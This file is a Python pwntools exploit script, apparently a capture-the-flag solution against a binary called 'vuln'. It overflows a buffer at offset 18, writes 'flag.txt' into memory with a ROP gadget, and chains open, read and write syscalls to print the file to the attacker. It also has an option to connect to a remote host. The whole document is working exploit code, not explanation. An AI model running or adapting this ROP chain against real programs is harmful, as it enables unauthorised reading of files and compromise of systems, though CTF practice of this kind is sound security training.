#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *burritos+90
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def www(value, addr):
    mov_rax_rsi = 0x4aee95 # mov qword ptr [rsi], rax ; ret
    pop_rsi = 0x402e08 # pop rsi ; ret
    pop_rax = 0x469407 # pop rax ; ret

    payload = flat([
        pop_rsi,
        addr,
        pop_rax,
        value,
        mov_rax_rsi
    ])

    return payload

def open(pathname, flag, rax, rdi, rsi, syscall):
    payload = flat([
        rax,
        0x2,
        rdi,
        pathname,
        rsi,
        flag,
        syscall
    ])

    return payload

def read(buf, rax, rdi, rsi, rdx, syscall):
    payload = flat([
        rax,
        0x0,
        rdi,
        0x3,
        rsi,
        buf,
        rdx,
        0x30,
        syscall
    ])

    return payload
    

def write(buf, rax, rdi, rsi, rdx, syscall):
    payload = flat([
        rax,
        0x1,
        rdi,
        0x1,
        rsi,
        buf,
        rdx,
        0x30,
        syscall
    ])

    return payload

def solve():
    pop_rax = 0x469407 # pop rax; ret;
    pop_rdi = 0x4018ea # pop rdi; ret
    pop_rsi = 0x402e08 # pop rsi; ret;
    pop_rdx = 0x4017ef # pop rdx; ret;
    syscall = 0x435844 # syscall; ret;

    offset = 18
    data = 0x4fd0e0

    arb_write = www(b"flag.txt", data)
    open_file = open(data, 0x0, pop_rax, pop_rdi, pop_rsi, syscall)
    read_file = read(data, pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall)
    write_to_stdout = write(data, pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall)

    payload = flat({
        offset: [
            arb_write,
            open_file,
            read_file,
            write_to_stdout
        ]
    })

    io.sendline("A")
    io.sendline(payload)


    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

